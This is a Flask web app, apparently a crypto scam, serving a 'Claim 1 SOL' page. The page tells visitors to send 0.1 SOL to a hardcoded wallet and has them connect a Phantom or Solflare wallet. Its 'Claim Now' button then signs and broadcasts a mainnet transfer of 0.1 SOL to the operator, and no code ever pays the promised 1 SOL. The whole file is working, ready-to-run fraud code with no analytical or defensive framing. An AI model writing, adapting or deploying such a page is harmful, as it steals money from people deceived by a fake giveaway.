from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
  <title>Claim 1 SOL</title>
  <meta charset="UTF-8">
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
  <style>
    body {
      background-color: black;
      color: white;
      text-align: center;
      font-family: Arial, sans-serif;
      padding: 40px;
    }
    .button {
      background: linear-gradient(to right, #00ff90, #00d178);
      border: none;
      color: black;
      font-weight: bold;
      padding: 14px 30px;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      margin: 10px;
    }
    .button:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    img.qr {
      width: 220px;
      margin: 20px auto;
      border-radius: 16px;
      box-shadow: 0 0 20px #00ff90;
      display: none;
    }
    #status {
      margin-top: 20px;
      color: #ccc;
      font-size: 0.9em;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>🎁 Claim 1 SOL</h1>
  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
  <p><code>{{ wallet }}</code></p>
  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
  
  <button class="button" id="connectBtn">🔗 Connect Wallet</button>
  <button class="button" id="claimBtn" style="display: none;">💸 Claim Now</button>
  <div id="status">Click "Connect Wallet" to begin.</div>

  <script>
    const status = document.getElementById("status");
    const qr = document.getElementById("qrCode");
    const connectBtn = document.getElementById("connectBtn");
    const claimBtn = document.getElementById("claimBtn");

    let provider = null;
    let publicKey = null;

    connectBtn.addEventListener("click", async () => {
      if (window.solana?.isPhantom) {
        provider = window.solana;
      } else if (window.solflare?.isSolflare) {
        provider = window.solflare;
      } else {
        status.innerText = "⚠️ No wallet found. Open this in Phantom or Solflare browser.";
        qr.style.display = "block";
        return;
      }

      try {
        status.innerText = "🔄 Connecting...";
        const resp = await provider.connect();
        publicKey = resp?.publicKey || provider.publicKey;
        status.innerText = "✅ Connected: " + publicKey.toString();
        claimBtn.style.display = "inline-block";
      } catch (err) {
        status.innerText = "❌ Wallet connection failed: " + (err.message || err);
      }
    });

    claimBtn.addEventListener("click", async () => {
      if (!publicKey) {
        status.innerText = "⚠️ Connect wallet first.";
        return;
      }

      try {
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
        const recipient = new solanaWeb3.PublicKey("{{ wallet }}");

        const transaction = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: recipient,
            lamports: 0.1 * solanaWeb3.LAMPORTS_PER_SOL,
          })
        );

        transaction.feePayer = publicKey;
        let { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;

        let signed = await provider.signTransaction(transaction);
        let txid = await connection.sendRawTransaction(signed.serialize());
        status.innerText = "📤 Transaction sent! Waiting for confirmation...\\nTx ID: " + txid;

        await connection.confirmTransaction(txid);
        status.innerText = "✅ Success! Transaction confirmed.\\nTx ID: " + txid;
      } catch (err) {
        console.error("Transaction Error:", err);
        status.innerText = "❌ Failed: " + (err?.message || "Unknown error");
      }
    });
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
